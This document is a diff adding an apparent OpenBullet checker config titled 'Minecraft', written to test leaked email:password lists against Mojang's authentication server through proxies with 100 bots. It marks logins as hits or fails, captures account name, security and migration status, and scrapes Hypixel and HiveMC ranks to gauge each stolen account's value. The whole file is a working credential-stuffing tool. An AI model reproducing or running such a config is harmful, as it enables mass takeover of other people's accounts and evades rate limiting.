@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Minecraft",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-06T12:53:01.4909096+03:00",
+  "AdditionalInfo": "Captures: Migrated | Hypixel Rank | HiveMC Rank | In-Game Name",
+  "Author": "future $#0419",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"<USER>\",\"password\":\"<PASS>\",\"requestUser\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}" 
+  KEYCHAIN Success OR 
+    KEY "accessToken\":\"" 
+    KEY "passwordChangedAt\":" 
+#Capture_Name PARSE "<SOURCE>" LR "name\":\"" "\",\"userId" -> CAP "Name" 
+#Capture_Secured PARSE "<SOURCE>" LR "secured\":" ",\"migrated" -> CAP "Secured" 
+#Capture_Migrated PARSE "<SOURCE>" LR ",\"migrated\":" "}," -> CAP "Migrated" 
+#Get_Capture_Rank_Hypixel REQUEST GET "https://hypixel.net/player/<Name>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Capture_Abo_Hypixel_ PARSE "<SOURCE>" LR "rank-badge rank-badge-mvp_plus\">" "</span" -> CAP "Rank Hypixel" 
+#Get_HiveMC REQUEST GET "https://hivemc.com/player/<Name>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "class=\"rank emerald\">" "</p>" -> CAP "HiveMC Rank" 
